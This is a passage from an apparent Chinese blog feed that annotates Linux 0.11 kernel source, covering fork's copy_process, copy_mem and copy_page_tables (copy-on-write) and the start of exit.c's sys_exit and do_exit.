class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 68</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_process</span><span class="params">(<span class="keyword">int</span> nr,<span class="keyword">long</span> ebp,<span class="keyword">long</span> edi,<span class="keyword">long</span> esi,<span class="keyword">long</span> gs,<span class="keyword">long</span> none,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">long</span> ebx,<span class="keyword">long</span> ecx,<span class="keyword">long</span> edx,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">long</span> fs,<span class="keyword">long</span> es,<span class="keyword">long</span> ds,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">long</span> eip,<span class="keyword">long</span> cs,<span class="keyword">long</span> eflags,<span class="keyword">long</span> esp,<span class="keyword">long</span> ss)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="comment">// 先获取一个空闲的内存页，用于存放新任务的 task_struct 结构体</span></span><br><span class="line">p = (struct task_struct *) get_free_page();</span><br><span class="line"><span class="keyword">if</span> (!p)<span class="comment">// 出错则返回</span></span><br><span class="line"><span class="keyword">return</span> -EAGAIN;</span><br><span class="line">task[nr] = p;<span class="comment">// 将新任务的 task_struct 结构体加入任务数组</span></span><br><span class="line">*p = *current;<span class="comment">// 复制父进程 task_struct 结构体的所有属性</span></span><br><span class="line">p-&gt;state = TASK_UNINTERRUPTIBLE;<span class="comment">// 先将新任务设为不可中断睡眠态，防止被调度执行</span></span><br><span class="line">p-&gt;pid = last_pid;<span class="comment">// last_pid 是在 find_empty_process 中找到的空闲 pid</span></span><br><span class="line">p-&gt;father = current-&gt;pid;<span class="comment">// 新进程的父进程设置为当前进程</span></span><br><span class="line">p-&gt;counter = p-&gt;priority;<span class="comment">// 初始化新进程运行的时间片，使其等于 priority 的值（一般为 0xf）</span></span><br><span class="line">p-&gt;signal = <span class="number">0</span>;<span class="comment">// 复位新进程信号位图、报警定时值、会话领头标志</span></span><br><span class="line">p-&gt;alarm = <span class="number">0</span>;</span><br><span class="line">p-&gt;leader = <span class="number">0</span>;</span><br><span class="line">p-&gt;utime = p-&gt;stime = <span class="number">0</span>;<span class="comment">// 初始化新进程用户态及内核态运行时间</span></span><br><span class="line">p-&gt;cutime = p-&gt;cstime = <span class="number">0</span>;<span class="comment">// 初始化新进程的子进程用户态及内核态运行时间</span></span><br><span class="line">p-&gt;start_time = jiffies;<span class="comment">// 初始化新进程的开始运行时间</span></span><br><span class="line"><span class="comment">// 以下是对新进程 tss 的设置，有关 tss 的结构在《保护模式》一文中有详细介绍</span></span><br><span class="line">p-&gt;tss.back_link = <span class="number">0</span>;<span class="comment">// 链接字段设置为空</span></span><br><span class="line">p-&gt;tss.esp0 = PAGE_SIZE + (<span class="keyword">long</span>) p;<span class="comment">// 内核栈顶指针指向这一页的顶端</span></span><br><span class="line">p-&gt;tss.ss0 = <span class="number">0x10</span>;<span class="comment">// 设置内核堆栈段选择子</span></span><br><span class="line">p-&gt;tss.eip = eip;<span class="comment">// eip 设置为父进程的中断恢复点（共用代码空间）</span></span><br><span class="line">p-&gt;tss.eflags = eflags;<span class="comment">// eflags 与父进程相同</span></span><br><span class="line">p-&gt;tss.eax = <span class="number">0</span>;<span class="comment">// fork 调用对子进程返回 0 由此体现出来</span></span><br><span class="line">p-&gt;tss.ecx = ecx;<span class="comment">// ecx,edx,ebx,esp,ebp,esi,edi 与父进程相同</span></span><br><span class="line">p-&gt;tss.edx = edx;</span><br><span class="line">p-&gt;tss.ebx = ebx;</span><br><span class="line">p-&gt;tss.esp = esp;</span><br><span class="line">p-&gt;tss.ebp = ebp;</span><br><span class="line">p-&gt;tss.esi = esi;</span><br><span class="line">p-&gt;tss.edi = edi;</span><br><span class="line">p-&gt;tss.es = es &amp; <span class="number">0xffff</span>;<span class="comment">// 六个段寄存器也与父进程一致，不过只有低 16 位有效</span></span><br><span class="line">p-&gt;tss.cs = cs &amp; <span class="number">0xffff</span>;</span><br><span class="line">p-&gt;tss.ss = ss &amp; <span class="number">0xffff</span>;</span><br><span class="line">p-&gt;tss.ds = ds &amp; <span class="number">0xffff</span>;</span><br><span class="line">p-&gt;tss.fs = fs &amp; <span class="number">0xffff</span>;</span><br><span class="line">p-&gt;tss.gs = gs &amp; <span class="number">0xffff</span>;</span><br><span class="line">p-&gt;tss.ldt = _LDT(nr);<span class="comment">// 设置新进程的局部描述符选择子，_LDT 定义在 include/linux/sched.h</span></span><br><span class="line"><span class="comment">// 设置 I/O 许可位图基址，高 16 位有效</span></span><br><span class="line"><span class="comment">// 默认设置为 0x8000，超出 tss 限长，表示实际没有 I/O 许可位图</span></span><br><span class="line">p-&gt;tss.trace_bitmap = <span class="number">0x80000000</span>;</span><br><span class="line"><span class="keyword">if</span> (last_task_used_math == current)<span class="comment">// 如果当前任务上次使用过协处理器</span></span><br><span class="line">__asm__(<span class="string">&quot;clts ; fnsave %0&quot;</span>::<span class="string">&quot;m&quot;</span> (p-&gt;tss.i387));<span class="comment">// 保存其上下文至 i387 字段</span></span><br><span class="line"><span class="keyword">if</span> (copy_mem(nr,p)) &#123;<span class="comment">// 设置新进程代码段与数据段描述符的基址与限长并实现写时复制技术</span></span><br><span class="line">task[nr] = <span class="literal">NULL</span>;<span class="comment">// 如果返回值不为 0，表示出错，将任务数组对应指针置为空</span></span><br><span class="line">free_page((<span class="keyword">long</span>) p);<span class="comment">// 释放之前获取的内存页并返回</span></span><br><span class="line"><span class="keyword">return</span> -EAGAIN;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;NR_OPEN;i++)<span class="comment">// 子进程与父进程共享打开的文件，因此对应文件打开次数 + 1</span></span><br><span class="line"><span class="keyword">if</span> (f=p-&gt;filp[i])</span><br><span class="line">f-&gt;f_count++;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;pwd)<span class="comment">// 同理需将父进程的 pwd、root、executable 的 i 节点引用次数 + 1</span></span><br><span class="line">current-&gt;pwd-&gt;i_count++;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;root)</span><br><span class="line">current-&gt;root-&gt;i_count++;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;executable)</span><br><span class="line">current-&gt;executable-&gt;i_count++;</span><br><span class="line"><span class="comment">// 下面两个宏定义在 include/asm/system.h 末尾</span></span><br><span class="line">set_tss_desc(gdt+(nr&lt;&lt;<span class="number">1</span>)+FIRST_TSS_ENTRY,&amp;(p-&gt;tss));<span class="comment">// 在 gdt 中设置新任务的 tss 描述符</span></span><br><span class="line">set_ldt_desc(gdt+(nr&lt;&lt;<span class="number">1</span>)+FIRST_LDT_ENTRY,&amp;(p-&gt;ldt));<span class="comment">// 在 gdt 中设置新任务的 ldt 描述符</span></span><br><span class="line">p-&gt;state = TASK_RUNNING;<span class="comment">// 完成所有初始化，将新任务的运行状态设置为就绪态</span></span><br><span class="line"><span class="keyword">return</span> last_pid;<span class="comment">// fork 对父进程返回正整数体现在此</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码需要注意的地方有两点：</p><ul><li>新进程 task_struct 结构体与其内核栈实际在同一内存页，从 <code>p-&gt;tss.esp0 = PAGE_SIZE + (long) p;</code> 可以看出，不过 task_struct 从页面底端开始，而内核栈从页面顶端开始往低地址生长</li><li>fork 函数调用对父进程返回正整数 <code>return last_pid;</code>，对子进程返回 0 <code>p-&gt;tss.eax = 0;</code>，在该函数得到体现</li></ul><br><h3 id="copy-process-gt-copy-mem"><a href="#copy-process-gt-copy-mem" class="headerlink" title="copy_process -&gt; copy_mem"></a>copy_process -&gt; copy_mem</h3><p>我们正一步一步深入 fork 函数的实现细节，且即将接触到写时复制的核心。copy_process 中调用了一个非常关键的函数 copy_mem，该函数接收两个参数，分别为由 find_empty_process 选出的空闲任务号及新进程的 task_struct 结构体指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 39</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_mem</span><span class="params">(<span class="keyword">int</span> nr,struct task_struct * p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> old_data_base,new_data_base,data_limit;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> old_code_base,new_code_base,code_limit;</span><br><span class="line"><span class="comment">// get_limit 与 get_base 都定义在 include/linux/sched.h</span></span><br><span class="line">code_limit=get_limit(<span class="number">0x0f</span>);<span class="comment">// 获取内核代码段及数据段的段限长</span></span><br><span class="line">data_limit=get_limit(<span class="number">0x17</span>);</span><br><span class="line">old_code_base = get_base(current-&gt;ldt[<span class="number">1</span>]);<span class="comment">// 获取当前进程代码段和数据段在线性空间中的基地址</span></span><br><span class="line">old_data_base = get_base(current-&gt;ldt[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">if</span> (old_data_base != old_code_base)<span class="comment">// 代码段和数据段基址需相同</span></span><br><span class="line">panic(<span class="string">&quot;We don&#x27;t support separate I&amp;D&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (data_limit &lt; code_limit)<span class="comment">// 数据段限长需大于代码段限长</span></span><br><span class="line">panic(<span class="string">&quot;Bad data_limit&quot;</span>);</span><br><span class="line"><span class="comment">// 新进程的代码段和数据段在线性空间中的基地址为（任务号 * 64MB）</span></span><br><span class="line">new_data_base = new_code_base = nr * <span class="number">0x4000000</span>;</span><br><span class="line">p-&gt;start_code = new_code_base;<span class="comment">// 设置新进程任务结构体的代码段起始地址字段</span></span><br><span class="line">set_base(p-&gt;ldt[<span class="number">1</span>],new_code_base);<span class="comment">// 设置（修改）新进程代码段描述符基址</span></span><br><span class="line">set_base(p-&gt;ldt[<span class="number">2</span>],new_data_base);<span class="comment">// 设置新进程数据段描述符基址</span></span><br><span class="line"><span class="comment">// 实现写时复制技术的核心函数 copy_page_tables</span></span><br><span class="line"><span class="keyword">if</span> (copy_page_tables(old_data_base,new_data_base,data_limit)) &#123;</span><br><span class="line">free_page_tables(new_data_base,data_limit);<span class="comment">// 如果出错则释放页表项并返回</span></span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数同样有两点需要注意：</p><ul><li>Linux 0.11 还不支持代码段和数据段分立，且数据段长度应大于代码段长度，故有 <code>old_data_base != old_code_base</code> 和 <code>data_limit &lt; code_limit</code> 这样的检查存在</li><li>Linux 0.11 中最多支持 64 个进程（包括 0 号进程）。因为 32 位线性地址空间大小为 4G，所以分配给每个进程的线性地址空间大小为 4G / 64 = 64 MB。故进程的代码和数据段在线性地址空间中的起始地址为 <strong>任务号 * 64MB</strong></li></ul><p>有关进程代码段数据段的布局如下图：</p><p><img src="../img/f1.png" alt="代码段与数据段"></p><p>故现在所说的数据空间实际上也包含了代码空间</p><br><h3 id="copy-process-gt-copy-mem-gt-copy-page-tables"><a href="#copy-process-gt-copy-mem-gt-copy-page-tables" class="headerlink" title="copy_process -&gt; copy_mem -&gt; copy_page_tables"></a>copy_process -&gt; copy_mem -&gt; copy_page_tables</h3><p>copy_mem 函数末尾调用了 copy_page_tables，正是该函数构建了写时复制技术的框架。其功能就是建立子进程数据空间到父进程数据空间的映射，并且将父子进程对于数据空间的访问权限都设置为只读。想要实现这些效果，那是不是得操作页目录项和页表项呀？没错，由分页机制可知，建立线性地址空间到物理地址空间的映射从本质上来说就是构建页目录和页表，子进程通过拷贝父进程数据空间对应的页表就能将自己的数据空间也映射到同一片物理内存区域。复制的过程中再修改一下页表项（PTE）中的 R/W 位，就能达到控制访问权限的目的了</p><p>copy_page_tables 就是按照这种思路实现的，其接收三个参数，from 是父进程代码/数据段基址（线性地址），to 是新进程代码/数据段基址（线性地址），size 是数据段的段限长（即父子进程共享的内存长度）。而线性地址是由页目录表索引（高 10 位）、页表索引（中间 10 位）和页内偏移（低 12 位）拼接成的，因此通过位移操作便可获得页目录及页表索引，进而访问/修改页目录项、页表项（如果对于分页机制的概念比较模糊，建议先花点时间看看 <a href="https://in1nit1t.github.io/2020/03/15/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/" target="_blank">保护模式</a> 一文的分页机制部分）。下面是对代码的分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mm/memory.c Line 151</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_page_tables</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> from,<span class="keyword">unsigned</span> <span class="keyword">long</span> to,<span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * from_page_table;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * to_page_table;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> this_page;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * from_dir, * to_dir;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((from&amp;<span class="number">0x3fffff</span>) || (to&amp;<span class="number">0x3fffff</span>))<span class="comment">// 检查是否满足 4MB 对齐</span></span><br><span class="line">panic(<span class="string">&quot;copy_page_tables called with wrong alignment&quot;</span>);</span><br><span class="line">from_dir = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) ((from&gt;&gt;<span class="number">20</span>) &amp; <span class="number">0xffc</span>);<span class="comment">// 计算源地址对应的页目录项指针</span></span><br><span class="line">to_dir = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) ((to&gt;&gt;<span class="number">20</span>) &amp; <span class="number">0xffc</span>);<span class="comment">// 计算目的地址对应的页目录项指针</span></span><br><span class="line">size = ((<span class="keyword">unsigned</span>) (size+<span class="number">0x3fffff</span>)) &gt;&gt; <span class="number">22</span>;<span class="comment">// 计算涉及到的页目录项数</span></span><br></pre></td></tr></table></figure><p>from 和 to 给出的线性基址应该是 4MB 对齐的（因为一个<strong>页目录项</strong>管理 4MB 的物理内存），函数首先就检验了一下对齐情况</p><p>接着计算源地址/目的地址对应的页目录项指针，需要注意的是，页目录是从物理地址 0 开始存放，且每个页目录项占 4 字节。所以在计算线性地址对应的页目录项指针时，理论上应该先将线性地址右移 22 位得到页目录索引，再乘以 4 得到页目录项的地址，相当于 <code>(a &gt;&gt; 22) &lt;&lt; 2</code> （假设 a 是线性地址）。然而这里选择了另一种表现形式，直接右移 20 位，再通过和 0xffc 进行与运算以保证低两位是 0（4 字节对齐）</p><p>在计算 size 的时候，右移 22 位表示除以 4MB，并且进行了<strong>舍入</strong>（size + 4MB - 1），例如当传入的 size 是 4.01MB 或 8 MB 时，计算结果都为 2（表示涉及两个<strong>页目录项</strong>）</p><p>接下来就要开始复制页表项了，通过嵌套 for 循环完成，并且设置每个页表项的 R/W 字段：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>( ; size--&gt;<span class="number">0</span> ; from_dir++,to_dir++) &#123;<span class="comment">// 外层循环对每个页目录项申请一页内存来保存页表</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span> &amp; *to_dir)<span class="comment">// 如果目的目录项指定的页表在内存中已经存在（P 位为 1）</span></span><br><span class="line">panic(<span class="string">&quot;copy_page_tables: already exist&quot;</span>);<span class="comment">// 则报错死机</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="number">1</span> &amp; *from_dir))<span class="comment">// 如果源目录项指定的页表不存在，则不进行页表的复制</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="comment">// 取源页表基址（PDE 高 20 位）</span></span><br><span class="line">from_page_table = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) (<span class="number">0xfffff000</span> &amp; *from_dir);</span><br><span class="line"><span class="keyword">if</span> (!(to_page_table = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *) get_free_page()))<span class="comment">// 申请一页内存来保存页表</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;<span class="comment">// 申请失败则返回</span></span><br><span class="line"><span class="comment">// 设置目的页目录项为刚申请的内存页地址或上 7（表示页表为用户级、可读可写、存在）</span></span><br><span class="line">*to_dir = ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) to_page_table) | <span class="number">7</span>;</span><br><span class="line"><span class="comment">// 计算应复制多少项到当前页表</span></span><br><span class="line"><span class="comment">// 如果 from 为 0（内核空间），则只需复制 0xA0 项页表项（前 160 页）</span></span><br><span class="line"><span class="comment">// 否则复制页表中全部的 1024 项</span></span><br><span class="line">nr = (from==<span class="number">0</span>)?<span class="number">0xA0</span>:<span class="number">1024</span>;</span><br><span class="line"><span class="keyword">for</span> ( ; nr-- &gt; <span class="number">0</span> ; from_page_table++,to_page_table++) &#123;<span class="comment">// 内层循环复制页表项</span></span><br><span class="line">this_page = *from_page_table;<span class="comment">// 复制源页表项到变量 this_page</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="number">1</span> &amp; this_page))<span class="comment">// 判断页表项指向的页在内存中是否存在</span></span><br><span class="line"><span class="keyword">continue</span>;<span class="comment">// 不存在则不复制该页表项</span></span><br><span class="line">this_page &amp;= ~<span class="number">2</span>;<span class="comment">// 存在则将其 R/W 位置 0，表示页面只读</span></span><br><span class="line">*to_page_table = this_page;<span class="comment">// 将修改后的页表项复制到目的页表中</span></span><br><span class="line"><span class="comment">// 如果该页表项所指向的物理地址在 1MB 以上，则还需要修改父进程的页表项，</span></span><br><span class="line"><span class="comment">// 使其对于数据空间的访问权限也为只读，这就是本文开篇提到的例外所在。</span></span><br><span class="line"><span class="comment">// 对于进程 0 来说，在 main.c 中调用 fork 创建出子进程用于运行 init 时，</span></span><br><span class="line"><span class="comment">// 因为复制的页面都还在内核区域，所以下面的语句不会被执行，即 0 号进程仍旧</span></span><br><span class="line"><span class="comment">// 可以随时读写。另外，还需设置 mem_map 数组，增加相应项的引用次数，同样放在</span></span><br><span class="line"><span class="comment">// 判断语句下是因为 mem_map 数组仅用于管理主内存区的页面使用情况</span></span><br><span class="line"><span class="keyword">if</span> (this_page &gt; LOW_MEM) &#123;<span class="comment">// 进程调用 execve 装载新程序时才会执行</span></span><br><span class="line">*from_page_table = this_page;<span class="comment">// 父进程对于数据空间的访问权限也修改为只读</span></span><br><span class="line">this_page -= LOW_MEM;</span><br><span class="line">this_page &gt;&gt;= <span class="number">12</span>;<span class="comment">// 计算当前内存页在 mem_map 数组中的索引值</span></span><br><span class="line">mem_map[this_page]++;<span class="comment">// 相应项的引用次数加 1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">invalidate();<span class="comment">// 一句将 0 赋值给 cr3 的汇编语句，意为刷新页变换高速缓冲</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，对于 fork 创建子进程及写时复制技术的分析就告一段落了，fork.c 中的 verify_area 函数以及 CPU 遇到页错误的处理方式（写时复制技术余下部分）还没有提到，等到 mm 模块再做记录 ~</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
            <tag> Linux0.11 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核源码阅读-kernel（四）</title>
      <link href="/2020/04/13/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-kernel%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
      <url>/2020/04/13/Linux%E5%86%85%E6%A0%B8%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB-kernel%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>这一期的内容比较轻松，主要是搞懂 exit.c 的代码，其中涉及到有关内存管理的函数也不深入，等到了 mm 模块再做分析，一些函数如果没有给出定义，那就是现在只需要知道它们的功能就好了。另外，下一篇文章将会阅读 fork.c，结合 sched.c，exit.c，fork.c 再回味一遍，就能构建起一个进程创建、调度、终止的框架</p><br><p>exit.c 主要实现了终止进程与进程退出的相关函数，即系统调用 exit 的处理流程。当调用 exit 函数时（参数为用户程序提供的退出码），实际调用 sys_exit。sys_exit 又调用 do_exit ，并保留退出码低字节，左移 8 位后当作 do_exit 的参数，空出来的这 8 位将用于保存 wait 函数的状态信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 137</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_exit</span><span class="params">(<span class="keyword">int</span> error_code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> do_exit((error_code&amp;<span class="number">0xff</span>)&lt;&lt;<span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>do_exit 函数根据当前进程的特性对其进行处理，并把当前进程状态设置为僵死态，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Line 102</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_exit</span><span class="params">(<span class="keyword">long</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="comment">// 释放当前进程 代码段 和 数据段 使用的内存页</span></span><br><span class="line">free_page_tables(get_base(current-&gt;ldt[<span class="number">1</span>]),get_limit(<span class="number">0x0f</span>));</span><br><span class="line">free_page_tables(get_base(current-&gt;ldt[<span class="number">2</span>]),get_limit(<span class="number">0x17</span>));</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_TASKS ; i++)<span class="comment">// 遍历任务进程数组</span></span><br><span class="line"><span class="keyword">if</span> (task[i] &amp;&amp; task[i]-&gt;father == current-&gt;pid) &#123;<span class="comment">// 如果该进程是当前进程的子进程</span></span><br><span class="line">task[i]-&gt;father = <span class="number">1</span>;<span class="comment">// 则将该进程的父进程设置为 1 号进程</span></span><br><span class="line"><span class="keyword">if</span> (task[i]-&gt;state == TASK_ZOMBIE)<span class="comment">// 如果该进程是僵死状态</span></span><br><span class="line">(<span class="keyword">void</span>) send_sig(SIGCHLD, task[<span class="number">1</span>], <span class="number">1</span>);<span class="comment">// 则向 1 号进程发送 SIGHCLD 信号</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_OPEN ; i++)<span class="comment">// 将当前进程打开的所有文件关闭</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;filp[i])</span><br><span class="line">sys_close(i);</span><br><span class="line">iput(current-&gt;pwd);<span class="comment">// 对当前进程的工作目录(pwd)，根目录(root)，</span></span><br><span class="line">current-&gt;pwd=<span class="literal">NULL</span>;<span class="comment">// 执行程序文件(executable)的 i 节点进行同步，</span></span><br><span class="line">iput(current-&gt;root);<span class="comment">// 放回各个 i 节点并置空(释放)</span></span><br><span class="line">current-&gt;root=<span class="literal">NULL</span>;</span><br><span class="line">iput(current-&gt;executable);</span><br><span class="line">current-&gt;executable=<span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 当前进程如果是会话的领头进程(leader)，并且有控制终端</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;leader &amp;&amp; current-&gt;tty &gt;= <span class="number">0</span>)</span><br><span class="line">tty_table[current-&gt;tty].pgrp = <span class="number">0</span>;<span class="comment">// 则释放该终端</span></span><br><span class="line"><span class="keyword">if</span> (last_task_used_math == current)<span class="comment">// 如果当前进程上次使用了协处理器</span></span><br><span class="line">last_task_used_math = <span class="literal">NULL</span>;<span class="comment">// 将记录的信息置空</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;leader)<span class="comment">// 当前进程如果是会话的领头进程</span></span><br><span class="line">kill_session();<span class="comment">// 则将该会话关闭</span></span><br><span class="line">current-&gt;state = TASK_ZOMBIE;<span class="comment">// 将当前进程状态置为僵死态</span></span><br><span class="line">current-&gt;exit_code = code;<span class="comment">// 当前进程退出码设置为用户程序给定的退出码</span></span><br><span class="line">tell_father(current-&gt;father);<span class="comment">// 向当前进程的父进程发送 SIGCHLD 信号，并释放内存</span></span><br><span class="line">schedule();<span class="comment">// 调用进程调度函数</span></span><br><span class="line"><span class="keyword">return</span> (<span class="number">-1</span>);<span class="comment">// 不会执行到这里来，加这一句为了防止编译的时候报 warning</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是 do_exit 中调用的一些函数的实现（按从上到下的顺序）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 